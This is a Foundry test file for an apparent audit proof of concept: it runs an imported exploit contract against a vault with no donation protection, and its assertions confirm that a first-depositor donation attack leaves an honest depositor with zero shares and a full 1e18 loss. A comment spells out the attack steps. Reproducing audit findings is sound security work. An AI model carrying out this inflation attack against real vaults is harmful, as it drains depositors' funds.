// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, NoopVault, Asset, Depositor} from "./56956-burve-noopvault-donation-attack-drains-assets-from-a-closure.sol";

// Burve H-7 (finding 56956): NoopVault is a bare ERC4626 vertex vault with no
// donation protection. An attacker front-runs the first deposit (1 wei -> 1 share),
// donates 2e18 directly to inflate the price, and the honest depositor (the Closure)
// then mints ZERO shares for a full 1e18 deposit and can redeem nothing.
contract Finding56956Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_noopVaultDonationAttack_drainsClosure() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("attacker shares (1 wei deposit)", e.attackerShares());
        emit log_named_uint("victim shares for 1e18 deposit", e.victimSharesReceived());
        emit log_named_uint("victim assets redeemable", e.victimAssetsBack());
        emit log_named_uint("harm magnitude (assets lost)", e.harmMagnitude());
        emit log_named_uint("sink balance (measured loss)", e.sinkBalance());

        // attacker seized the first share for 1 wei
        assertEq(e.attackerShares(), 1, "attacker should mint the first share");
        // the honest Closure deposit minted ZERO shares -> total loss
        assertEq(e.victimSharesReceived(), 0, "victim must receive 0 shares (the bug)");
        assertEq(e.victimAssetsBack(), 0, "victim must be unable to redeem anything");
        // the full 1e18 deposit is lost and measured at the sink
        assertEq(e.harmMagnitude(), 1e18, "victim lost its full deposit");
        assertEq(e.sinkBalance(), 1e18, "harm materialized at sink");
        assertEq(e.asset().balanceOf(SINK), 1e18, "sink holds the drained magnitude");
    }
}
